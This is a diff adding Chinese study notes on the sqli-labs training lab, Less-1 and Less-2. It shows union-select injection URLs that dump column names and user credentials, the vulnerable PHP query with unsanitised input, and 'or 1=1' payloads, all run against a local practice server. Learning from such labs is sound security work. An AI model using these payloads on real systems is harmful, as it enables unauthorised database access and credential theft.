@@ -35,3 +35,23 @@ http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_n
 爆数据
 http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20users%20where%20id=2--+
 此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,username,password from users where id=2--+ LIMIT 0,1
+
+##
+我们又得到了一个Mysql返回的错误，提示我们语法错误。
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1′ at line 1
+现在执行的查询语句如下：
+Select * from TABLE where id = 1' ;
+所以这里的奇数个单引号破坏了查询，导致抛出错误。
+因此我们得出的结果是，查询代码使用了整数。
+Select * from TABLE where id = (some integer value);
+现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以注释掉剩余的查询：
+http://localhost/sqli-labs/Less-2/?id=1–-+
+
+源代码中可以分析到SQL语句为下：
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+对id没有经过处理
+
+可以成功注入的有：
+or 1=1
+or 1=1 --+
+其余的payload与less1中一直，只需要将less1中的 ' 去掉即可。
